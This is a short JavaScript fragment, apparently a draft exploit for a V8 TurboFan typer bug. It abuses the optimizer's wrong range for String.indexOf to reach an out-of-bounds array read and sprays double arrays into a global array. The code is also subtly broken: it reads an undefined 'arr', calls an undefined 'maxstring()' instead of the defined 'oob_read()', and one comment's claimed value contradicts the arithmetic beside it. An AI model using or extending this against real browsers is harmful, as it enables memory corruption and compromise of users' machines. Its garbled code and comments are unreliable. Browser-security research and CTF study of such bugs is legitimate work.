var arr_global = new Array(0x100);

function oob_read() {
    // force TurboFan
    try {} finally {}
  
    var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28);
    i += 16; // real value: i = 2**28, optimizer: i = 2**28-1
    i >>= 28; // real value i = 1, optimizer: i = 0
    i *= 5; // real value i = 100000, optimizer: i = 0
    if (i > 3) {
      return 0;
    } else {
      var oob_initial = [{},{},{}];
      for(let i = 0; i < 100; i++){
        arr_global[i] = [0.1,0.2,0.3,0.4]; //write a lot double array into arr_global.
      }
      //let arr3= new Array(1.1,2.2,3.3,4.4);
      
      print(arr.length);
      return arr[i];
    }
  }
  
  function opttest() {
    // call in a loop to trigger optimization
    for (var i = 0; i < 100000; i++) {
      var o = maxstring();
      if (o == 0 || o == undefined) {
        continue;
      }
      return o;
    }
    console.log("fail");
  }
  
  opttest();
  